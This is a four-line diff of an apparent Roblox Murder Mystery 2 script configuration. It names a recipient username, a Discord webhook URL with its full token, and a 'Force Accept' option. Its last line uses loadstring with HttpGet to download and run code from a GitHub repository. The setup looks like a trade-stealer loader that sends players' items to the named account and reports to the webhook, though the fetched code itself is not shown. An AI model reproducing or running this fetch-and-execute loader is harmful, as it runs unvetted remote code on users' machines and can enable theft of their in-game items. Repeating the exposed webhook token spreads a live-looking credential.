@@ -1,5 +1,4 @@
 Username = "CANARTICHOUYOTU2020"
 Webhook = "https://discord.com/api/webhooks/1300568473185026111/n0CQnb4znAtzRkBeY9wQmzoFGCZSR5tnFToKaO6kSEZca7eSRQpg5VHhoo1_Epk1vsUS"
 Script = "Vertex" (Force Accept, Vertex) for now
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SILENTGORE/thecakewasalie2/refs/heads/main/thecakealternative/mm2/main"))()
